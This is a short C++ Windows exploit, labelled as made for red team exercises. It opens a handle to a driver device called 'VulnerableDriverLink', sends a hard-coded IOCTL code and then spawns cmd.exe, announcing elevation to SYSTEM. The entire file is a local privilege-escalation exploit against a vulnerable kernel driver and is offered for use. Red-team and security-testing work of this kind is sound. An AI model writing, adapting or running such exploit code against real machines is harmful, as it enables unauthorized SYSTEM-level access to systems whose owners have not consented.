/*
Exploit Created by Joas to Red Team Exercises 
*/

#include <windows.h>
#include <iostream>

#define DEVICE_NAME L"\\\\.\\VulnerableDriverLink"  // Device name
#define IOCTL_CODE 2236416                         // Found IOCTL code

void SpawnSystemShell() {
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (CreateProcess(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        std::cout << "[+] SYSTEM cmd opened successfully!" << std::endl;
    }
    else {
        std::cout << "[-] Failed to open cmd.exe, error: " << GetLastError() << std::endl;
    }
}

int main() {
    std::cout << "[+] Attempting to open a handle to the driver..." << std::endl;

    HANDLE hDevice = CreateFile(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE,
        0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hDevice == INVALID_HANDLE_VALUE) {
        std::cout << "[-] Failed to open the device. Error code: " << GetLastError() << std::endl;
        return 1;
    }

    std::cout << "[+] Device opened successfully!" << std::endl;

    DWORD bytesReturned;
    BOOL status = DeviceIoControl(hDevice, IOCTL_CODE, NULL, 0, NULL, 0, &bytesReturned, NULL);

    if (status) {
        std::cout << "[+] IOCTL sent successfully! Elevating to SYSTEM..." << std::endl;
        SpawnSystemShell();
    }
    else {
        std::cout << "[-] Failed to send IOCTL. Error code: " << GetLastError() << std::endl;
    }

    CloseHandle(hDevice);
    return 0;
}
